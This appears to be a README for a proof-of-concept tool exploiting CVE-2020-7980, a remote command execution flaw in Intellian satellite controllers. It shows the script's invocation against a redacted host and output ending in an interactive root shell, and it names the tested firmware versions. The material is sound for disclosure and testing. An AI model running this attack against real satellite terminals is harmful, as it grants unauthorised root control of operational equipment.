# Satellian-CVE-2020-7980
Satellian is a PoC script that shows RCE vulnerability over Intellian Satellite controller (Intellian Aptus Web).

The following script will try to list all the binaries in the system and afterwards will allow the tester to interact directly with the server (usually as root).

# PoC
```
xh4h@Macbook-xh4h ~/Satellian> python satellian.py -u http://<redacted>
                  ________________________________________
         (__)    /                                        \
         (oo)   (     Intellian Satellite Terminal PoC     )
  /-------\/ --' \________________________________________/ 
 / |     ||
*  ||----||             

Performing initial scan. Listing available system binaries.
Starting request to http://<redacted>
Executing command /bin/ls /bin
acu_server
acu_tool
addgroup
adduser
...

Satellian $ id
uid=0(root) gid=0(root)
```

# Tested versions
Intellian v1.12, v1.21, v1.24.


# Disclaimer
All the information in this repository is for educational purposes only. The author of the repository is in no way responsible for any misuse of the information. This script is just a proof of concept, and has not been in no way developed for malicious activities.
